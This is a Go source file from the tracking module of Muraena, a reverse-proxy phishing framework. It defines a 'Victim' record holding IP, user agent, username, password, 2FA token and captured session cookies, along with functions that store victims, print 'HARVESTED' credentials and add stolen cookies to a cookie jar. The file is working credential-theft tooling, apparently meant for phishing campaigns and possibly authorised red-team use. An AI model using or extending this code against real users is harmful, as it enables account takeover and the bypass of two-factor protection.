package tracking

import (
	"fmt"
	"os"
	"strconv"
	"sync"
	"time"

	"github.com/muraenateam/muraena/log"
	"github.com/muraenateam/muraena/module/necrobrowser"

	"github.com/evilsocket/islazy/tui"
)

// Victim identifies a User-Agent being tracked
type Victim struct {
	ID        string // UUID
	IP        string
	UA        string
	FirstSeen time.Time
	LastSeen  time.Time
	Username  string
	Password  string
	Token     string // 2FA token
	//Session   string // Cookies

	Credentials []*VictimCredentials

	// map of "cookie name" -> SessionCookie struct
	Cookies sync.Map

	RequestCount int
}

// VictimCredentials structure
type VictimCredentials struct {
	Key   string
	Value string
	Time  time.Time
}

// GetVictim returns a victim
func (module *Tracker) GetVictim(t *Trace) (v *Victim, err error) {

	if !t.IsValid() {
		return nil, fmt.Errorf(fmt.Sprintf("GetVictim invalid tracking value [%s]", tui.Bold(tui.Red(t.ID))))
	}

	victim, found := module.Victims.Load(t.ID)
	if found {
		return victim.(*Victim), nil
	}

	return nil, fmt.Errorf(fmt.Sprintf("No victim found with ID [%s]", tui.Bold(tui.Red(t.ID))))
}

// ShowCredentials prints the credentials in the CLI
func (module *Tracker) ShowCredentials() {

	columns := []string{
		"ID",
		"Key",
		"Value",
		"When",
	}

	var rows [][]string
	module.Victims.Range(func(k, v interface{}) bool {
		_, victim := k.(string), v.(*Victim)

		for _, c := range victim.Credentials {

			t := tui.Green(victim.ID)
			//if victim.Anonymous {
			//	t = t + tui.Red(" (anonymous)")
			//}

			rows = append(rows, []string{tui.Bold(t), c.Key, c.Value, c.Time.UTC().Format("2006-01-02 15:04:05")})
			log.BufLogInfo(fmt.Sprintf("HARVESTED (at: %s) [%s] %s = %s", c.Time.UTC().Format("2006-01-02 15:04:05"), t, c.Key, c.Value))
		}
		return true
	})

	tui.Table(os.Stdout, columns, rows)

}

// ShowVictims prints the Victims in the CLI
func (module *Tracker) ShowVictims() {

	columns := []string{
		"ID",
		"IP",
		"UA",
		"# Credentials",
		"# Requests",
	}

	var rows [][]string
	module.Victims.Range(func(k, v interface{}) bool {
		_, vv := k.(string), v.(*Victim)

		if len(vv.Credentials) > 0 {
			rows = append(rows, []string{tui.Bold(vv.ID), vv.IP, vv.UA, strconv.Itoa(len(vv.Credentials)),
				strconv.Itoa(vv.RequestCount)})
		}
		return true
	})

	tui.Table(os.Stdout, columns, rows)
}

// Push another Victim to the Tracker
func (module *Tracker) Push(v *Victim) {

	// Do not override an existing victim ..
	_, found := module.Victims.Load(v.ID)
	if !found {
		module.Victims.Store(v.ID, v)
	}
}

func (module *Tracker) AddToCookieJar(v *Victim, cookie necrobrowser.SessionCookie) {

	if cookie.Domain == module.Session.Config.Proxy.Phishing {
		return
	}

	vv, found := module.Victims.Load(v.ID)
	if !found {
		module.Debug("ERROR: Victim %s not found in Victims syncMap", v.ID)
		return
	}

	victim := vv.(*Victim)
	cookieKey := fmt.Sprintf("%s_%s_%s", cookie.Name, cookie.Path, cookie.Domain)
	victim.Cookies.Store(cookieKey, cookie)

	module.Info("[%s] New cookie %s:%s [%s] (key: %s)", victim.ID, tui.Bold(cookie.Name), tui.Bold(cookie.Value),
		tui.Bold(cookie.Domain), tui.Red(cookieKey))

	module.Victims.Store(victim.ID, victim)
}
